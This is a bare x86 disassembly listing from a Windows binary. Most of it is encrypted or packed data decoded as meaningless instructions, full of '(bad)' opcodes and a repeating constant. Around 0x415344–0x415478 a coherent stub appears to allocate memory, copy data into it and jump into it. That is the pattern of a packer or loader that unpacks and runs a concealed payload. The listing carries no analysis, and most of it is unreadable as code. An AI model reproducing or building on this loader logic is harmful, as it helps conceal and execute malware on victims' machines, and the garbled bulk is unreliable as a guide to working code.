  4150b5:	cmp    eax,0xc737f0
  4150ba:	lahf   
  4150bb:	ins    DWORD PTR es:[edi],dx
  4150bc:	push   eax
  4150bd:	jp     0x415117
  4150bf:	out    0xc8,eax
  4150c1:	add    DWORD PTR [ebp+ebp*2-0xa],edx
  4150c5:	jg     0x4150f7
  4150c7:	fdiv   st,st(0)
  4150c9:	inc    ebx
  4150ca:	and    al,0x8b
  4150cc:	adc    al,dl
  4150ce:	int3   
  4150cf:	jns    0x4150ef
  4150d1:	jg     0x4150f1
  4150d3:	mov    dh,0xe0
  4150d5:	pushf  
  4150d6:	jp     0x4150f0
  4150d8:	repnz sahf 
  4150da:	dec    ecx
  4150db:	sub    eax,0x2e9224f3
  4150e0:	inc    ecx
  4150e1:	push   ds
  4150e2:	xchg   esp,eax
  4150e3:	inc    esi
  4150e4:	jle    0x415091
  4150e6:	jmp    0x1fe9:0xfa2d5641
  4150ed:	icebp  
  4150ee:	std    
  4150ef:	enter  0x5344,0x6c
  4150f3:	sub    al,0x8
  4150f5:	retf   0x21a8
  4150f8:	or     esi,ebx
  4150fa:	pop    ss
  4150fb:	inc    edi
  4150fc:	cli    
  4150fd:	mov    ds:0x39df2672,al
  415102:	push   esp
  415103:	mov    ebp,0x69914133
  415108:	xor    DWORD PTR [ebx],edi
  41510a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41510b:	(bad)  
  41510d:	ret    
  41510e:	add    cl,bl
  415110:	pop    eax
  415111:	pop    esp
  415112:	jo     0x4150cd
  415114:	ficom  WORD PTR [ecx]
  415116:	in     eax,dx
  415117:	inc    ecx
  415118:	ins    DWORD PTR es:[edi],dx
  415119:	not    DWORD PTR [esi+0x27]
  41511c:	xor    ch,BYTE PTR [edi]
  41511e:	add    ebp,DWORD PTR [esi]
  415120:	and    DWORD PTR [ebp-0x21],esi
  415123:	mov    BYTE PTR [si],bl
  415126:	and    eax,0xf01810f7
  41512b:	pop    esi
  41512c:	(bad)  [ecx+0x48]
  41512f:	shl    BYTE PTR [edx],0xe9
  415132:	shr    BYTE PTR [ebx-0x11],cl
  415135:	in     eax,0xe7
  415137:	scas   al,BYTE PTR es:[edi]
  415138:	icebp  
  415139:	js     0x4151aa
  41513b:	and    DWORD PTR [edx],ebp
  41513d:	daa    
  41513e:	in     al,dx
  41513f:	xchg   BYTE PTR [esi],al
  415141:	xor    esp,ecx
  415143:	and    eax,ebx
  415145:	pop    edx
  415146:	push   ebx
  415147:	xor    BYTE PTR [edi-0x5f6b5bbd],al
  41514d:	sbb    bl,BYTE PTR [ecx]
  41514f:	rol    BYTE PTR [eax-0x7c76c312],cl
  415155:	sbb    al,0x7d
  415157:	test   ebx,esp
  415159:	push   esp
  41515a:	xchg   esi,eax
  41515b:	pop    ds
  41515c:	xor    eax,0x109f0e79
  415161:	sub    ebp,esi
  415163:	push   edx
  415164:	int    0x7b
  415166:	xchg   esi,eax
  415167:	jp     0x41513e
  415169:	xchg   esp,eax
  41516a:	pop    ebp
  41516b:	cwde   
  41516c:	sub    al,0x3b
  41516e:	jl     0x415184
  415170:	(bad)  
  415171:	lods   al,BYTE PTR ds:[esi]
  415172:	and    eax,0xf2200045
  415177:	(bad)  
  415178:	or     edx,DWORD PTR [edi-0x32]
  41517b:	jecxz  0x4151d4
  41517d:	jle    0x415106
  41517f:	jg     0x41510d
  415181:	dec    esi
  415182:	adc    cl,0xf8
  415185:	push   cs
  415186:	ja     0x4151c1
  415188:	hlt    
  415189:	ja     0x4151c6
  41518b:	stos   BYTE PTR es:[edi],al
  41518c:	out    0x84,eax
  41518e:	iret   
  41518f:	pop    esi
  415190:	out    0xf,eax
  415192:	call   0xeae9:0xab94cbf7
  415199:	call   0x9135310c
  41519e:	pop    ebx
  41519f:	push   edx
  4151a0:	in     eax,dx
  4151a1:	fst    DWORD PTR [ebp+eiz*1-0x53]
  4151a5:	jno    0x4151ff
  4151a7:	icebp  
  4151a8:	inc    edi
  4151a9:	test   BYTE PTR [ecx+0x67835481],bl
  4151af:	mov    BYTE PTR [esi],cl
  4151b1:	sub    BYTE PTR [ebp-0x37e13788],dl
  4151b7:	jmp    0x4151ba
  4151b9:	jg     0x415195
  4151bb:	div    ch
  4151bd:	outs   dx,DWORD PTR ds:[esi]
  4151be:	inc    edi
  4151bf:	fcomi  st,st(0)
  4151c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151c2:	js     0x4151fb
  4151c4:	pusha  
  4151c5:	inc    edx
  4151c6:	adc    cl,BYTE PTR [eax+0x50598699]
  4151cc:	je     0x415152
  4151ce:	fimul  DWORD PTR [ecx-0x96b8d9]
  4151d4:	mov    ebp,0xc2152df1
  4151d9:	fwait
  4151da:	imul   esp,DWORD PTR [edx+0x3badf271],0x7d
  4151e1:	fsubr  DWORD PTR [edi]
  4151e3:	jp     0x415214
  4151e5:	lods   al,BYTE PTR ds:[esi]
  4151e6:	das    
  4151e7:	addr16 dec ebx
  4151e9:	cmc    
  4151ea:	ja     0x41521f
  4151ec:	stc    
  4151ed:	and    ch,BYTE PTR [ecx+0x42b23d90]
  4151f3:	mov    bh,0x3a
  4151f5:	lds    edx,FWORD PTR [edi]
  4151f7:	sbb    al,0xb4
  4151f9:	out    dx,eax
  4151fa:	inc    esi
  4151fb:	(bad)
  4151fe:	js     0x41518d
  415200:	cmc    
  415201:	lahf   
  415202:	addr16 mov ds:0x548e,eax
  415206:	rcl    DWORD PTR [eax],0x5d
  415209:	call   0xd4fea46c
  41520e:	retf   
  41520f:	xor    cl,BYTE PTR [eax+0x1595577e]
  415215:	ret    0xeea
  415218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415219:	jo     0x415207
  41521b:	lods   eax,DWORD PTR ds:[esi]
  41521c:	ins    BYTE PTR es:[edi],dx
  41521d:	sti    
  41521e:	cli    
  41521f:	dec    edx
  415220:	rol    DWORD PTR [edi],0xb3
  415223:	jl     0x41523e
  415225:	pop    ds
  415226:	mov    ds:0xa24f83aa,eax
  41522b:	jecxz  0x4151c1
  41522d:	mov    ah,0x7e
  41522f:	jnp    0x41529b
  415231:	dec    edx
  415232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415233:	outs   dx,BYTE PTR ds:[esi]
  415234:	jecxz  0x41521e
  415236:	repnz push ds
  415238:	adc    bh,dl
  41523a:	cli    
  41523b:	xor    DWORD PTR [eax+ebp*2],ebx
  41523e:	pop    ds
  41523f:	je     0x4151cf
  415241:	xor    al,0xd
  415243:	dec    ecx
  415244:	leave  
  415245:	add    dl,BYTE PTR [esi]
  415247:	repnz dec ebx
  415249:	aam    0x7a
  41524b:	mov    esi,0xcfad07f5
  415250:	or     eax,0xe16b79f6
  415255:	cli    
  415256:	cmp    al,0x14
  415258:	pop    es
  415259:	jp     0x4151e6
  41525b:	int3   
  41525c:	sub    DWORD PTR [esi+0x2b],esp
  41525f:	xchg   esp,eax
  415260:	cmp    ebp,DWORD PTR [ebx-0x7e339fa4]
  415266:	mov    bl,0x1d
  415268:	(bad)  
  415269:	das    
  41526a:	jge    0x415208
  41526c:	mov    al,ds:0xdac0af68
  415271:	(bad)  
  415272:	enter  0x331c,0xaa
  415276:	cmc    
  415277:	mov    bl,0x7
  415279:	fstp   DWORD PTR [esi]
  41527b:	xor    eax,0x318d0258
  415280:	mov    esp,0xc1a73548
  415285:	push   edx
  415286:	addr16 inc edx
  415288:	leave  
  415289:	mov    ch,0x6f
  41528b:	shl    DWORD PTR [esi+0x37304a34],1
  415291:	xchg   esi,eax
  415292:	cmp    al,0xf8
  415294:	adc    BYTE PTR [ebx+0x39553d47],bh
  41529a:	stos   BYTE PTR es:[edi],al
  41529b:	in     al,0x99
  41529d:	popa   
  41529e:	or     DWORD PTR [ebx],esi
  4152a0:	dec    esi
  4152a1:	inc    ecx
  4152a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152a3:	and    BYTE PTR [ebx-0x3193663f],0xa4
  4152aa:	out    0xc5,al
  4152ac:	(bad)  [eax]
  4152ae:	scas   al,BYTE PTR es:[edi]
  4152af:	popa   
  4152b0:	aaa    
  4152b1:	xchg   esp,eax
  4152b2:	sbb    al,0xf
  4152b4:	jno    0x4152ce
  4152b6:	lsl    ebx,WORD PTR [ebx+esi*2+0x6f]
  4152bb:	jecxz  0x4152ce
  4152bd:	loopne 0x41532c
  4152bf:	jl     0x415264
  4152c1:	movsx  esi,BYTE PTR [edx-0x6e]
  4152c5:	mul    DWORD PTR [edx+0x44]
  4152c8:	xchg   esp,eax
  4152c9:	ror    BYTE PTR [edx+0x51d8fe02],1
  4152cf:	adc    eax,0xb59446fc
  4152d4:	pop    es
  4152d5:	xchg   BYTE PTR [edx+edx*4-0x37],ch
  4152d9:	popa   
  4152da:	jne    0x415330
  4152dc:	je     0x415268
  4152de:	xor    ebx,DWORD PTR [edi+ebp*2]
  4152e1:	into   
  4152e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152e3:	icebp  
  4152e4:	jmp    0x7f9beff5
  4152e9:	outs   dx,BYTE PTR ds:[esi]
  4152ea:	pushw  ds
  4152ec:	mov    edx,0x97b083a
  4152f1:	inc    edi
  4152f2:	retf   
  4152f3:	cmp    al,0x1a
  4152f5:	jp     0x415340
  4152f7:	sahf   
  4152f8:	es in  al,dx
  4152fa:	push   esp
  4152fb:	jns    0x41529e
  4152fd:	push   es
  4152fe:	and    ah,BYTE PTR [ebp-0x66]
  415301:	jae    0x41531d
  415303:	ror    DWORD PTR [edi+edi*1],1
  415306:	ja     0x4152f8
  415308:	sub    al,0x44
  41530a:	sub    al,0xe2
  41530c:	loop   0x4152ba
  41530e:	pop    edx
  41530f:	sub    DWORD PTR ds:0x2e7d3450,ebp
  415315:	sbb    esp,esp
  415317:	loope  0x4152a1
  415319:	mov    ecx,0xe3d96305
  41531e:	inc    esp
  41531f:	outs   dx,BYTE PTR ds:[esi]
  415320:	sbb    al,cl
  415322:	sub    di,cx
  415325:	sub    bl,BYTE PTR [eax]
  415327:	sub    ah,bl
  415329:	inc    edi
  41532a:	fist   WORD PTR [esi]
  41532c:	jo     0x41530f
  41532e:	stos   DWORD PTR es:[edi],eax
  41532f:	mov    ds:0x393b368a,al
  415334:	les    edi,FWORD PTR [edx+eiz*2+0x7b]
  415338:	mov    al,0xa3
  41533a:	popa   
  41533b:	add    eax,0x425f5e21
  415340:	push   ecx
  415341:	das    
  415342:	dec    esp
  415343:	std    
  415344:	push   0xd59efaef
  415349:	(bad)  
  41534a:	call   DWORD PTR ds:0x41702c
  415350:	mov    DWORD PTR [ebp-0x2c],eax
  415353:	movzx  edx,WORD PTR [ebp-0x2c]
  415357:	cmp    edx,0x539
  41535d:	jne    0x41538e
  41535f:	mov    DWORD PTR [ebp-0x14],0xe0d
  415366:	lea    eax,[ebp-0x28]
  415369:	push   eax
  41536a:	call   DWORD PTR ds:0x417030
  415370:	mov    DWORD PTR [ebp-0x60],eax
  415373:	mov    DWORD PTR [ebp-0x54],0x3a
  41537a:	mov    BYTE PTR [ebp-0x34],0x0
  41537e:	mov    DWORD PTR [ebp-0x8],0xa48d061a
  415385:	mov    DWORD PTR [ebp-0x68],0x10acf7
  41538c:	jmp    0x415395
  41538e:	mov    BYTE PTR ds:0x419f40,0x0
  415395:	push   0x0
  415397:	call   DWORD PTR ds:0x417030
  41539d:	mov    DWORD PTR [ebp-0x2c],eax
  4153a0:	push   DWORD PTR ds:0x417030
  4153a6:	pop    edx
  4153a7:	mov    DWORD PTR [ebp-0x6c],edx
  4153aa:	lea    ecx,[ebp-0x40]
  4153ad:	push   ecx
  4153ae:	mov    edx,DWORD PTR [ebp-0x60]
  4153b1:	push   edx
  4153b2:	call   DWORD PTR ds:0x417038
  4153b8:	mov    DWORD PTR [ebp-0x44],eax
  4153bb:	push   DWORD PTR [ebp-0x30]
  4153be:	push   0x1000
  4153c3:	mov    eax,DWORD PTR [ebp-0x14]
  4153c6:	add    eax,0x23
  4153c9:	add    eax,0x23
  4153cc:	push   eax
  4153cd:	xor    eax,eax
  4153cf:	push   eax
  4153d0:	mov    ecx,DWORD PTR [ebp-0x44]
  4153d3:	call   ecx
  4153d5:	push   eax
  4153d6:	pop    ecx
  4153d7:	mov    DWORD PTR [ebp-0x4],ecx
  4153da:	mov    eax,DWORD PTR [ebp-0x68]
  4153dd:	sub    eax,0xdae0b
  4153e2:	mov    DWORD PTR [ebp-0x68],eax
  4153e5:	cmp    DWORD PTR [ebp-0x4],0x0
  4153e9:	jne    0x415403
  4153eb:	push   0x0
  4153ed:	push   0x0
  4153ef:	call   0x416aac
  4153f4:	push   0x0
  4153f6:	call   DWORD PTR ds:0x417040
  4153fc:	mov    BYTE PTR ds:0x42fed0,0x0
  415403:	mov    ecx,DWORD PTR [ebp-0x4]
  415406:	add    ecx,DWORD PTR [ebp-0x14]
  415409:	mov    edx,DWORD PTR [ebp-0x8]
  41540c:	mov    DWORD PTR [ecx],edx
  41540e:	mov    eax,DWORD PTR [ebp-0x4]
  415411:	add    eax,DWORD PTR [ebp-0x54]
  415414:	mov    DWORD PTR [ebp-0x5c],eax
  415417:	mov    ecx,DWORD PTR ds:0x417038
  41541d:	mov    DWORD PTR [ebp-0x4c],ecx
  415420:	mov    edx,DWORD PTR [ebp-0x4]
  415423:	add    edx,DWORD PTR [ebp-0x14]
  415426:	mov    eax,DWORD PTR [ebp+0x8]
  415429:	mov    DWORD PTR [edx+0x4],eax
  41542c:	mov    ecx,DWORD PTR [ebp-0x4]
  41542f:	add    ecx,DWORD PTR [ebp-0x14]
  415432:	mov    DWORD PTR [ebp-0xc],ecx
  415435:	cmp    DWORD PTR [ebp-0x68],0x0
  415439:	jbe    0x415456
  41543b:	mov    edx,DWORD PTR [ebp-0xc]
  41543e:	push   edx
  41543f:	mov    eax,DWORD PTR [ebp-0x14]
  415442:	push   eax
  415443:	mov    ecx,DWORD PTR [ebp-0x2c]
  415446:	add    ecx,DWORD PTR [ebp-0x68]
  415449:	push   ecx
  41544a:	mov    edx,DWORD PTR [ebp-0x4]
  41544d:	push   edx
  41544e:	call   0x4169bf
  415453:	add    esp,0x10
  415456:	cmp    DWORD PTR [ebp-0x5c],0x0
  41545a:	je     0x41546a
  41545c:	push   DWORD PTR [ebp-0x4c]
  41545f:	push   DWORD PTR [ebp-0x6c]
  415462:	mov    edx,DWORD PTR [ebp-0x5c]
  415465:	push   eax
  415466:	jmp    edx
  415468:	jmp    0x415470
  41546a:	mov    eax,DWORD PTR [ebp+0x8]
  41546d:	mov    DWORD PTR [ebp-0x18],eax
  415470:	mov    eax,0x1
  415475:	mov    esp,ebp
  415477:	pop    ebp
  415478:	ret    
  415479:	push   ebp
  41547a:	mov    ebp,esp
  41547c:	pop    ebp
  41547d:	ret    
  41547e:	push   ebp
  41547f:	mov    ebp,esp
  415481:	sub    esp,0x54
  415484:	mov    DWORD PTR [ebp-0x34],0x0
  41548b:	mov    DWORD PTR [ebp-0x4],0x0
  415492:	mov    DWORD PTR [ebp-0x50],0x0
  415499:	mov    DWORD PTR [ebp-0x4c],0x0
  4154a0:	mov    DWORD PTR [ebp-0x30],0x0
  4154a7:	lea    eax,[ebp-0x48]
  4154aa:	push   eax
  4154ab:	call   DWORD PTR ds:0x417028
  4154b1:	mov    ecx,DWORD PTR [ebp-0x34]
  4154b4:	push   ecx
  4154b5:	call   0x4154e4
  4154ba:	add    esp,0x4
  4154bd:	call   0x4169b0
  4154c2:	mov    DWORD PTR [ebp-0x54],0x0
  4154c9:	jmp    0x4154d4
  4154cb:	mov    edx,DWORD PTR [ebp-0x54]
  4154ce:	add    edx,0x1
  4154d1:	mov    DWORD PTR [ebp-0x54],edx
  4154d4:	cmp    DWORD PTR [ebp-0x54],0x64
  4154d8:	jae    0x4154dc
  4154da:	jmp    0x4154cb
  4154dc:	xor    eax,eax
  4154de:	mov    esp,ebp
  4154e0:	pop    ebp
  4154e1:	ret    0x10
  4154e4:	push   ebp
  4154e5:	mov    ebp,esp
  4154e7:	sub    esp,0x3c
  4154ea:	push   esi
  4154eb:	mov    DWORD PTR [ebp-0x3c],0x0
  4154f2:	mov    DWORD PTR [ebp-0x38],0x0
  4154f9:	mov    DWORD PTR [ebp-0x30],0x0
  415500:	mov    DWORD PTR [ebp-0x24],0x0
  415507:	mov    DWORD PTR [ebp-0x1c],0x0
  41550e:	mov    DWORD PTR [ebp-0x28],0x0
  415515:	mov    DWORD PTR [ebp-0x2c],0x449408
  41551c:	mov    DWORD PTR [ebp-0x24],0x23e53794
  415523:	mov    DWORD PTR [ebp-0x34],0x0
  41552a:	mov    eax,DWORD PTR [ebp-0x24]
  41552d:	mov    DWORD PTR [ebp-0x20],eax
  415530:	mov    DWORD PTR [ebp-0x4],0x0
  415537:	mov    ecx,DWORD PTR ds:0x41702c
  41553d:	mov    DWORD PTR [ebp-0x4],ecx
  415540:	push   0x0
  415542:	push   0x4e
  415544:	push   0x1e
  415546:	push   0x0
  415548:	push   0xffffffff
  41554a:	call   DWORD PTR ds:0x417034
  415550:	test   eax,eax
  415552:	je     0x41698f
  415558:	scas   eax,DWORD PTR es:[edi]
  415559:	mov    bl,0x31
  41555b:	test   al,0xbe
  41555d:	daa    
  41555e:	xchg   esi,eax
  41555f:	(bad)
  415562:	into   
  415563:	mov    eax,ds:0xa1e91d38
  415568:	adc    BYTE PTR [ebp-0x3c3a69d9],bh
  41556e:	mov    esi,ecx
  415570:	loope  0x415539
  415572:	loop   0x41555d
  415574:	mov    eax,ds:0x9627bda8
  415579:	(bad)
  41557c:	into   
  41557d:	mov    eax,ds:0xa1e9e2c7
  415582:	test   al,0xbd
  415584:	daa    
  415585:	xchg   esi,eax
  415586:	(bad)
  415589:	into   
  41558a:	mov    eax,ds:0xa1e9e2c7
  41558f:	test   al,0xbd
  415591:	daa    
  415592:	xchg   esi,eax
  415593:	(bad)
  415596:	into   
  415597:	mov    eax,ds:0xaf53fdc9
  41559c:	test   al,0x9
  41559e:	cs pop ebx
  4155a0:	in     al,0x7b
  4155a2:	mov    BYTE PTR [edx-0x7e491994],al
  4155a8:	enter  0x9ddb,0x57
  4155ac:	in     al,0xaa
  4155ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155af:	sti    
  4155b0:	scas   eax,DWORD PTR es:[edi]
  4155b1:	int3   
  4155b2:	out    0x81,eax
  4155b4:	mov    bh,cl
  4155b6:	(bad)  
  4155b7:	rcl    BYTE PTR [ebx-0x4a],cl
  4155ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155bc:	test   eax,0xc2a9d4bc
  4155c1:	or     bh,0x88
  4155c4:	stc    
  4155c5:	push   0xe6aee5c5
  4155ca:	stos   BYTE PTR es:[edi],al
  4155cb:	(bad)  
  4155cc:	jmp    0x8ced3ac0
  4155d1:	mov    ebp,0xc3c59627
  4155d6:	mov    esi,ecx
  4155d8:	fisttp DWORD PTR [eax]
  4155da:	hlt    
  4155db:	addr16 lahf 
  4155dd:	push   es
  4155de:	(bad)  
  4155e1:	imul   edi,DWORD PTR [ebx-0x40f00fac],0x3f
  4155e8:	int3   
  4155e9:	xchg   edx,eax
  4155ea:	dec    esi
  4155eb:	pusha  
  4155ec:	add    eax,0xac1ebd38
  4155f1:	std    
  4155f2:	jae    0x41560e
  4155f4:	pop    ebp
  4155f5:	inc    edi
  4155f6:	fnstenv [ebp-0x68]
  4155f9:	adc    al,0x45
  4155fb:	sbb    dh,dl
  4155fd:	daa    
  4155fe:	mov    dh,0x7c
  415600:	xchg   esi,eax
  415601:	cmp    bh,BYTE PTR [edx]
  415603:	jl     0x415598
  415605:	adc    ebx,DWORD PTR [edi+0x4b]
  415608:	repnz adc eax,0x69961372
  41560e:	call   0xb3fa:0x567e9634
  415615:	imul   edi,DWORD PTR [ebx-0x41f00fac],0x3f
  41561c:	mov    al,ds:0xe560d00e
  415621:	sbb    BYTE PTR [edi-0x269f46e2],ch
  415627:	sbb    al,bh
  415629:	fidiv  DWORD PTR [esi+0x75]
  41562c:	les    ecx,FWORD PTR [ecx-0x4519e712]
  415632:	sub    al,0x7c
  415634:	clc    
  415635:	dec    esp
  415636:	xchg   ecx,eax
  415637:	jl     0x4155c6
  415639:	mov    es,edx
  41563b:	dec    ebx
  41563c:	cli    
  41563d:	ins    DWORD PTR es:[edi],dx
  41563e:	icebp  
  41563f:	adc    esi,ebx
  415641:	scas   al,BYTE PTR es:[edi]
  415642:	add    DWORD PTR [ecx-0x53af961],0x89c3c596
  41564c:	into   
  41564d:	mov    eax,ds:0xa1e9e2c7
  415652:	test   al,0xbd
  415654:	daa    
  415655:	xchg   esi,eax
  415656:	(bad)
  415659:	into   
  41565a:	mov    eax,ds:0xa1e9e2c7
  41565f:	test   al,0xed
  415661:	bound  edx,QWORD PTR [esi-0x3277703b]
  415667:	mov    eax,ds:0xeea4aca1
  41566c:	test   al,0xbd
  41566e:	daa    
  41566f:	xchg   esi,eax
  415670:	(bad)
  415673:	into   
  415674:	inc    ecx
  415675:	(bad)  
  415676:	loopne 0x415660
  415678:	stos   BYTE PTR es:[edi],al
  415679:	test   eax,0x279627b7
  41567e:	(bad)  
  41567f:	mov    esi,ecx
  415681:	and    eax,0xa1e9e2c1
  415686:	test   al,0xbd
  415688:	fs sub eax,ebp
  41568b:	ret    
  41568c:	mov    esi,ebx
  41568e:	mov    eax,ds:0xa4e9e2c7
  415693:	test   al,0xbd
  415695:	daa    
  415696:	(bad)  
  415697:	(bad)
  41569a:	into   
  41569b:	mov    eax,ds:0xa1e9e0c7
  4156a0:	lods   eax,DWORD PTR ds:[esi]
  4156a1:	mov    ebp,0xc3c59626
  4156a6:	mov    esi,ecx
  4156a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156a9:	(bad)  
  4156aa:	jecxz  0x415695
  4156ac:	mov    eax,ds:0x9627bda8
  4156b1:	cmc    
  4156b2:	iret   
  4156b3:	mov    esi,ecx
  4156b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156b6:	(bad)  
  4156b7:	loop   0x41569c
  4156b9:	pop    edi
  4156ba:	lods   al,BYTE PTR ds:[esi]
  4156bb:	mov    ebp,0x42859625
  4156c0:	mov    esi,ecx
  4156c2:	mov    cl,0xc7
  4156c4:	loop   0x4156bf
  4156c6:	mov    eax,ds:0x8627bda8
  4156cb:	(bad)
  4156ce:	into   
  4156cf:	mov    eax,ds:0xa1e9e2c7
  4156d4:	mov    eax,0xc59627bd
  4156d9:	ret    
  4156da:	mov    esi,ecx
  4156dc:	mov    eax,ds:0xa5e9e2c7
  4156e1:	test   al,0xb1
  4156e3:	daa    
  4156e4:	iret   
  4156e5:	mov    bl,0x89
  4156e8:	into   
  4156e9:	popa   
  4156ea:	int3   
  4156eb:	loop   0x4156a9
  4156ed:	sahf   
  4156ee:	test   al,0xbd
  4156f0:	daa    
  4156f1:	xchg   esi,eax
  4156f2:	(bad)
  4156f5:	into   
  4156f6:	mov    eax,ds:0xa1e9e2c7
  4156fb:	test   al,0xbd
  4156fd:	daa    
  4156fe:	xchg   esi,eax
  4156ff:	(bad)
  415702:	ret    0xdfa1
  415705:	loop   0x4156f0
  415707:	mov    eax,ds:0x9627bda8
  41570c:	(bad)
  41570f:	into   
  415710:	mov    eax,ds:0xa1e9e2c7
  415715:	test   al,0xbd
  415717:	daa    
  415718:	xchg   esi,eax
  415719:	(bad)
  41571c:	into   
  41571d:	mov    eax,ds:0xa1e9e2c7
  415722:	test   al,0xbd
  415724:	daa    
  415725:	xchg   esi,eax
  415726:	(bad)
  415729:	into   
  41572a:	mov    eax,ds:0xa1e9e2c7
  41572f:	test   al,0xbd
  415731:	daa    
  415732:	xchg   esi,eax
  415733:	(bad)
  415736:	into   
  415737:	mov    eax,ds:0xa1e9e2c7
  41573c:	test   al,0xbd
  41573e:	daa    
  41573f:	xchg   esi,eax
  415740:	(bad)
  415743:	into   
  415744:	mov    eax,ds:0xa1e9e2c7
  415749:	test   al,0xbd
  41574b:	daa    
  41574c:	xchg   esi,eax
  41574d:	(bad)
  415750:	into   
  415751:	mov    eax,ds:0xa1e9e2c7
  415756:	test   al,0xbd
  415758:	or     edx,esp
  41575a:	mov    al,ds:0xa1cefdbb
  41575f:	(bad)  
  415760:	loop   0x4157bb
  415762:	stos   BYTE PTR es:[edi],al
  415763:	test   al,0xbd
  415765:	aaa    
  415766:	xchg   esi,eax
  415767:	(bad)
  41576a:	retf   0xc7a1
  41576d:	out    0xe9,al
  41576f:	mov    eax,ds:0xa464f8f8
  415774:	xchg   ecx,eax
  415775:	mov    WORD PTR [ecx-0x1d385e32],cs
  41577b:	jmp    0xc7ff0001
  415780:	mov    eax,0xadfbb0b7
  415785:	mov    eax,ds:0xc1e9e2c7
  41578a:	test   al,0xbd
  41578c:	daa    
  41578d:	push   esi
  41578e:	into   
  41578f:	ret    
  415790:	mov    DWORD PTR [ecx+eiz*4-0x5a7c1d39],ebx
  415797:	test   al,0xbd
  415799:	daa    
  41579a:	xchg   esi,eax
  41579b:	(bad)
  41579e:	into   
  41579f:	mov    eax,ds:0xa1e9e2c7
  4157a4:	mov    BYTE PTR [ebp-0x4e1489d9],bh
  4157aa:	in     al,dx
  4157ab:	mov    ds:0xe9e2a4ce,al
  4157b0:	mov    eax,ds:0x9627bdaa
  4157b5:	in     eax,0xcf
  4157b7:	mov    esi,ecx
  4157b9:	mov    ds:0x1de9e2c7,eax
  4157be:	lods   al,BYTE PTR ds:[esi]
  4157bf:	mov    ebp,0xc3c59627
  4157c4:	mov    esi,ecx
  4157c6:	mov    eax,ds:0xa1e9e2c7
  4157cb:	test   al,0xfd
  4157cd:	daa    
  4157ce:	xchg   esi,eax
  4157cf:	add    eax,0xa1ce89c3
  4157d4:	(bad)  
  4157d5:	loop   0x4157c0
  4157d7:	mov    eax,ds:0x9627bda8
  4157dc:	(bad)
  4157df:	into   
  4157e0:	mov    eax,ds:0xa1e9e2c7
  4157e5:	test   al,0xbd
  4157e7:	daa    
  4157e8:	xchg   esi,eax
  4157e9:	(bad)
  4157ec:	into   
  4157ed:	mov    eax,ds:0xa1e9e2c7
  4157f2:	test   al,0xbd
  4157f4:	daa    
  4157f5:	xchg   esi,eax
  4157f6:	(bad)
  4157f9:	into   
  4157fa:	mov    eax,ds:0xa1e9e2c7
  4157ff:	test   al,0xbd
  415801:	daa    
  415802:	xchg   esi,eax
  415803:	(bad)
  415806:	into   
  415807:	mov    eax,ds:0xa1e9e2c7
  41580c:	test   al,0xbd
  41580e:	daa    
  41580f:	xchg   esi,eax
  415810:	(bad)
  415813:	into   
  415814:	mov    eax,ds:0xa1e9e2c7
  415819:	test   al,0xbd
  41581b:	daa    
  41581c:	xchg   esi,eax
  41581d:	(bad)
  415820:	into   
  415821:	mov    eax,ds:0xa1e9e2c7
  415826:	test   al,0xbd
  415828:	daa    
  415829:	xchg   esi,eax
  41582a:	(bad)
  41582d:	into   
  41582e:	mov    eax,ds:0xa1e9e2c7
  415833:	test   al,0xbd
  415835:	daa    
  415836:	xchg   esi,eax
  415837:	(bad)
  41583a:	into   
  41583b:	mov    eax,ds:0xa1e9e2c7
  415840:	test   al,0xbd
  415842:	daa    
  415843:	xchg   esi,eax
  415844:	(bad)
  415847:	into   
  415848:	mov    eax,ds:0xa1e9e2c7
  41584d:	test   al,0xbd
  41584f:	daa    
  415850:	xchg   esi,eax
  415851:	(bad)
  415854:	into   
  415855:	mov    eax,ds:0xa1e9e2c7
  41585a:	test   al,0xbd
  41585c:	daa    
  41585d:	xchg   esi,eax
  41585e:	(bad)
  415861:	into   
  415862:	mov    eax,ds:0xa1e9e2c7
  415867:	test   al,0xbd
  415869:	daa    
  41586a:	xchg   esi,eax
  41586b:	(bad)
  41586e:	into   
  41586f:	mov    eax,ds:0xa1e9e2c7
  415874:	test   al,0xbd
  415876:	daa    
  415877:	xchg   esi,eax
  415878:	(bad)
  41587b:	into   
  41587c:	mov    eax,ds:0xa1e9e2c7
  415881:	test   al,0xbd
  415883:	daa    
  415884:	xchg   esi,eax
  415885:	(bad)
  415888:	into   
  415889:	mov    eax,ds:0xa1e9e2c7
  41588e:	test   al,0xbd
  415890:	daa    
  415891:	xchg   esi,eax
  415892:	(bad)
  415895:	into   
  415896:	mov    eax,ds:0xa1e9e2c7
  41589b:	test   al,0xbd
  41589d:	daa    
  41589e:	xchg   esi,eax
  41589f:	(bad)
  4158a2:	into   
  4158a3:	mov    eax,ds:0xa1e9e2c7
  4158a8:	test   al,0xbd
  4158aa:	daa    
  4158ab:	xchg   esi,eax
  4158ac:	(bad)
  4158af:	into   
  4158b0:	mov    eax,ds:0xa1e9e2c7
  4158b5:	test   al,0xbd
  4158b7:	daa    
  4158b8:	xchg   esi,eax
  4158b9:	(bad)
  4158bc:	into   
  4158bd:	mov    eax,ds:0xa1e9e2c7
  4158c2:	test   al,0xbd
  4158c4:	daa    
  4158c5:	xchg   esi,eax
  4158c6:	(bad)
  4158c9:	into   
  4158ca:	mov    eax,ds:0xa1e9e2c7
  4158cf:	test   al,0xbd
  4158d1:	daa    
  4158d2:	xchg   esi,eax
  4158d3:	(bad)
  4158d6:	into   
  4158d7:	mov    eax,ds:0xa1e9e2c7
  4158dc:	test   al,0xbd
  4158de:	daa    
  4158df:	xchg   esi,eax
  4158e0:	(bad)
  4158e3:	into   
  4158e4:	mov    eax,ds:0xa1e9e2c7
  4158e9:	test   al,0xbd
  4158eb:	daa    
  4158ec:	xchg   esi,eax
  4158ed:	(bad)
  4158f0:	into   
  4158f1:	mov    eax,ds:0xa1e9e2c7
  4158f6:	test   al,0xbd
  4158f8:	daa    
